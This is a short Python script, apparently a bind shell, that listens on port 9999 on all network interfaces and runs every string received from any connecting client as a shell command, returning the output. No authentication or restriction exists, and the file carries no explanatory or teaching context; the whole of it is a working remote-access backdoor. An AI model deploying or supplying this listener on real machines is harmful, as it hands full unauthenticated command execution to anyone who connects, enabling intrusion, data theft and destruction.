import socket
import subprocess

HOST = '0.0.0.0'
PORT = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"[*] Listening on {HOST}:{PORT}")

try:  
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Accepted connection from {client_address}")
        
        while True:
            response = client_socket.recv(1024)
            command = response.decode()
            if command.strip() == 'exit':
                break
            # print(command)
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stdout: client_socket.send(output.stdout.encode())
            if output.stderr: client_socket.send(output.stderr.encode())

        client_socket.close()

except KeyboardInterrupt:
    print("Server shutting down...")
    server_socket.close()